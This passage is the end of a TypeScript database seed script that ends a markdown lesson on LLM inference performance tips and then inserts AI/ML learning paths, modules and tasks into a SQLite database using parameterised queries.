## Performance Tips
- Use continuous batching
- Enable KV cache
- Consider quantization (AWQ, GPTQ)`
					}
				]
			}
		]
	}
];

async function seed() {
	console.log('Seeding AI/ML learning paths with detailed content...');

	for (const project of aiPaths) {
		const existing = sqlite.prepare('SELECT id FROM paths WHERE name = ?').get(project.name) as { id: number } | undefined;
		if (existing) {
			sqlite.prepare('DELETE FROM paths WHERE id = ?').run(existing.id);
			console.log(`Replaced existing path: ${project.name}`);
		}

		const pathResult = db.insert(schema.paths).values({
			name: project.name,
			description: project.description,
			color: project.color,
			language: project.language,
			skills: project.skills,
			startHint: project.startHint,
			difficulty: project.difficulty,
			estimatedWeeks: project.estimatedWeeks,
			schedule: project.schedule
		}).returning().get();

		console.log(`Created path: ${project.name}`);

		for (let i = 0; i < project.modules.length; i++) {
			const mod = project.modules[i];
			const moduleResult = db.insert(schema.modules).values({
				pathId: pathResult.id,
				name: mod.name,
				description: mod.description,
				orderIndex: i
			}).returning().get();

			for (let j = 0; j < mod.tasks.length; j++) {
				const task = mod.tasks[j];
				sqlite.prepare(`
					INSERT INTO tasks (module_id, title, description, details, order_index, completed)
					VALUES (?, ?, ?, ?, ?, 0)
				`).run(moduleResult.id, task.title, task.description, task.details, j);
			}
		}
	}

	console.log('Seeding complete!');
}

seed().catch(console.error);
